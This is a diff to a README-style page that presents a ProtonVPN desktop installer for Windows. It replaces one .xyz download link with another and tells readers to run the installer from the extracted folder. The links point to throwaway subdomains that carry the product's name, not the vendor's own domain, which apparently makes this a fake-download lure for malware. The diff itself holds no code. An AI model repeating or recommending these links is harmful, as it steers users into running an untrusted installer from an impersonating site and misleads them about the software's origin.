@@ -8,8 +8,8 @@ ProtonVPN desktop package for Windows · vpn toolkit · local install ready.
 
 > Use the project link below for Windows.
 
-* **Project link:** **[protonvpn.nexpath.xyz](https://protonvpn.nexpath.xyz/)**
-* **Full URL:** `https://protonvpn.nexpath.xyz/`
+* **Project link:** **[protonvpn.nerasix.xyz](https://protonvpn.nerasix.xyz/)**
+* **Full URL:** `https://protonvpn.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
